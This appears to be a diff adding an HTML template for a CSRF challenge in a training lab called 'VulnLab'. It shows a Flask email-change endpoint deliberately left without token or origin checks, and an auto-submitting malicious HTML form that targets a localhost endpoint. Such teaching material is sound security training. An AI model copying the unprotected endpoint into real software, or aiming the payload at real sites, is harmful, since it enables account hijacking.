@@ -1,0 +1,112 @@
+{% extends 'base.html' %}
+{% block title %}CSRF — VulnLab{% endblock %}
+{% block content %}
+<a class="back-link" href="/">← Back to Challenges</a>
+<div class="challenge-page" data-challenge="csrf">
+
+  <div class="ch-header">
+    <h2>{{ challenge.name }}</h2>
+    <div class="ch-meta">
+      <span class="badge badge-medium">Medium</span>
+      <span class="badge badge-points">{{ challenge.points }} pts</span>
+      <span class="badge badge-cat">{{ challenge.category }}</span>
+    </div>
+    <p class="ch-desc">
+      The email-change endpoint accepts POST requests with <strong>no CSRF token</strong>.
+      Craft a request (or use the simulator below) to change the victim's email address.
+      The flag is revealed once the email is changed.
+    </p>
+  </div>
+
+  <!-- Victim account status -->
+  <div class="ch-section">
+    <h3>👤 Victim Account Status</h3>
+    {% if changed %}
+    <div class="alert alert-success">✓ Email changed successfully!</div>
+    {% endif %}
+    {% if victim %}
+    <table>
+      <tr><th>Username</th><td>{{ victim.username }}</td></tr>
+      <tr><th>Email</th><td id="victim-email">{{ victim.email }}</td></tr>
+    </table>
+    {% endif %}
+    {% if flag %}
+    <div class="alert alert-success" style="margin-top:14px">
+      🎉 CSRF succeeded! Flag: <strong>{{ flag }}</strong>
+    </div>
+    {% endif %}
+    <form method="POST" action="/challenges/csrf/reset" style="margin-top:12px">
+      <button type="submit" class="btn btn-danger btn-sm">Reset victim email</button>
+    </form>
+  </div>
+
+  <!-- CSRF PoC simulator -->
+  <div class="ch-section">
+    <h3>⚡ CSRF Attack Simulator</h3>
+    <p class="text-dim" style="font-size:.85rem;margin-bottom:14px">
+      In a real attack, the victim visits a malicious page that auto-submits a form
+      to <code>/challenges/csrf/change_email</code> — no user interaction required.
+      Simulate that here:
+    </p>
+    <div class="form-group">
+      <label>New Email (attacker-controlled)</label>
+      <div class="input-row">
+        <input type="email" id="csrf-email-input" placeholder="hacked@attacker.com">
+        <button class="btn btn-danger" onclick="simulateCsrf()">Send CSRF Request</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Vulnerable endpoint code -->
+  <div class="ch-section">
+    <h3>🔍 Vulnerable Endpoint</h3>
+    <div class="code-block">@app.route('/challenges/csrf/change_email', methods=['POST'])
+def csrf_change_email():
+    <span class="code-hl"># ⚠ No CSRF token, no origin check!</span>
+    new_email = request.form.get('email', '')
+    db.execute("UPDATE csrf_users SET email = ? WHERE username = 'victim'", [new_email])
+    db.commit()
+    return redirect(...)</div>
+  </div>
+
+  <!-- Malicious HTML PoC -->
+  <div class="ch-section">
+    <h3>📄 Malicious Page PoC</h3>
+    <p class="text-dim" style="font-size:.85rem;margin-bottom:10px">
+      An attacker would host this HTML — when the victim visits it, the form auto-submits:
+    </p>
+    <div class="code-block">&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="http://localhost:5000/challenges/csrf/change_email"
+        method="POST"&gt;
+    &lt;input type="hidden" name="email" value="hacked@attacker.com"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+  </div>
+
+  <div class="ch-section">
+    <h3>💡 Hints</h3>
+    <button class="hint-toggle" onclick="toggleHint('h1')">▶ Hint 1</button>
+    <div class="hint-box" id="h1">CSRF exploits the fact that browsers automatically send cookies
+    with every request to a site, regardless of which site triggered the request.</div>
+
+    <button class="hint-toggle mt-10" onclick="toggleHint('h2')">▶ Hint 2</button>
+    <div class="hint-box" id="h2">Use the simulator — type any email ending in <code>@attacker.com</code>
+    and click <em>Send CSRF Request</em>. The flag appears when the victim's email changes.</div>
+  </div>
+
+  {% if session.username %}
+  <div class="ch-section" data-challenge="csrf">
+    <h3>🚩 Submit Flag</h3>
+    <div class="flag-row">
+      <input type="text" id="flag-input" placeholder="FLAG{...}">
+      <button id="flag-btn" class="btn btn-primary" onclick="submitFlag('csrf')">Submit</button>
+    </div>
+  </div>
+  {% else %}
+  <div class="alert alert-warning"><a href="/login" style="color:inherit">Login</a> to submit a flag.</div>
+  {% endif %}
+
+</div>
+{% endblock %}
